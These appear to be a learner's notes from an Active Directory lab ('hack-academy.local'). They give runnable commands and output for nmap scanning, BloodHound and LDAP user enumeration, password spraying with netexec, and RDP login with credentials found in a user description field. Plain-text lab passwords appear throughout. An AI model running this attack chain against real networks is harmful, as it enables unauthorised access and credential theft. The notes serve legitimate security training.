
```
sudo ip link set dev eth0 mtu 1000
```

```
lbennett
!!reiD123

hack-academy.local
```

```
netexec smb 10.0.2.0/24 #run it a couple of times
```

```
lbennett
!!reiD123

hack-academy.local

10.0.2.3      kali 
10.0.2.4      DC01
10.0.2.7      CLIENT-1 
10.0.2.9      CLIENT-2
```

```
sudo nmap -sV -Pn -p 53, 88, 389, 1234 --open 10.0.2.4
```

```
10.0.2.4
10.0.2.7
10.0.2.9 
```

```
sudo nmap --min-rate 10000 -sCV -p- -Pn -iL IPLIST.txt
```

If you want to scan a list of ip's : 
```
-iL IPLIST.txt
```
then run : 
```
nmap -p- -Pn -iL IPLIST.txt -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn -iL IPLIST.txt -sV -sC -v -oN nmap_sVSc.txt
```


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 10000 -sCV -p- -Pn -iL IPLIST.txt
[sudo] password for kali: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-31 07:58 -0400
Stats: 0:00:57 elapsed; 0 hosts completed (3 up), 3 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.00% done; ETC: 08:00 (0:00:56 remaining)
Nmap scan report for DC01.hack-academy.local (10.0.2.4)
Host is up (0.026s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-31 12:00:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53501/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
MAC Address: 08:00:27:40:1A:93 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-31T12:02:51
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:40:1a:93 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.7
Host is up (0.039s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server?
| ssl-cert: Subject: commonName=Client-1.hack-academy.local
| Not valid before: 2026-10-30T21:41:15
|_Not valid after:  2027-05-01T21:41:15
5040/tcp  open  unknown
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
49670/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 08:00:27:80:1D:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: CLIENT-1, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:1d:57 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.9
Host is up (0.024s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-31T12:03:47+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=Client-2.hack-academy.local
| Not valid before: 2026-10-30T21:43:12
|_Not valid after:  2027-05-01T21:43:12
| rdp-ntlm-info: 
|   Target_Name: HACK-ACADEMY
|   NetBIOS_Domain_Name: HACK-ACADEMY
|   NetBIOS_Computer_Name: CLIENT-2
|   DNS_Domain_Name: hack-academy.local
|   DNS_Computer_Name: Client-2.hack-academy.local
|   Product_Version: 10.0.19041
|_  System_Time: 2026-10-31T12:03:00+00:00
7680/tcp  open  pando-pub?
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:6C:31:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT-2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:6c:31:cf (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5s, deviation: 0s, median: 5s
| smb2-time: 
|   date: 2026-10-31T12:03:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 332.62 seconds
                                                                  
```

```
lbennett
!!reiD123

hack-academy.local

10.0.2.4      DC01
10.0.2.7      CLIENT-1 
10.0.2.9      CLIENT-2
```

COLLECT AD DATA FIRST as `<username>` :
```
bloodhound-python -u 'lbennett' -p '!!reiD123' -d hack-academy.local -ns 10.0.2.4 -c All --zip
```

```
netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\lbennett:!!reiD123 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 16 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-11-29 14:30:04 12       Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             12       Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 12       Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             mjohnson                      2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             lbennett                      2025-11-24 01:40:43 0                                                                    
LDAP        10.0.2.4        389    DC01             egreen                        2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             spatel                        2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             dreyes                        2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             nflores                       2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             clee                          2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             otran                         2025-11-24 01:40:44 12                                                                   
LDAP        10.0.2.4        389    DC01             zmiller                       2025-11-24 01:40:44 12                                                                   
LDAP        10.0.2.4        389    DC01             mross                         2025-11-24 01:40:44 12                                                                   
LDAP        10.0.2.4        389    DC01             twest                         2025-11-29 15:16:20 0        HappyCactus$10                                              
LDAP        10.0.2.4        389    DC01             eknight                       2025-11-24 01:40:44 0                                                                    
LDAP        10.0.2.4        389    DC01             mthompson                     2025-11-29 14:53:23 3   
```

``
```
netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
```

==🔵Anonymous LDAP Username enumeration==
see the DECRIPTION AND USERNAME of all 
==🔴zoom out and print in a line and see the description also==
```
netexec ldap 10.129.95.210 -u '' -p '' --users
```
If you found usernames , put all into a file :
```
netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users | awk '{print $5}' | fgrep -v '[*]' | tee users2.txt
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users | awk '{print $5}' | fgrep -v '[*]' | tee users2.txt
[+]
-Username-
Administrator
Guest
krbtgt
mjohnson
lbennett
egreen
spatel
dreyes
nflores
clee
otran
zmiller
mross
twest
eknight
mthompson

```

#### ==🔵Password Spraying (password reuse : If you have a password of any user and a username list):==

If you have a username list and a single password :
```
nxc smb 10.0.2.4 -d hack-academy.local -u users2.txt -p 'HappyCactus$10' --continue-on-success
```

```
[+] hack-academy.local\twest:HappyCactus$10 
```

```
lbennett
!!reiD123

twest
HappyCactus$10 

hack-academy.local

10.0.2.3      kali 
10.0.2.4      DC01
10.0.2.7      CLIENT-1 
10.0.2.9      CLIENT-2   (RDP allowed)
```


```
netexec smb iplist.txt -u users.txt -p passwords.txt --continue-on-success
```



```
xfreerdp /v:10.0.2.9 /u:twest@'hack-academy.local' /p:'HappyCactus$10' /cert:ignore /dynamic-resolution
```

If you have a username list and a single password (FOR SMB) :
```
netexec smb iplist.txt -d hack-academy.local -u users2.txt -p passwords.txt  --continue-on-success
```

If you have a username list and a single password (FOR RDP) :
```
nxc rdp 10.0.2.7 -d hack-academy.local -u users2.txt -p passwords.txt  --continue-on-success
```

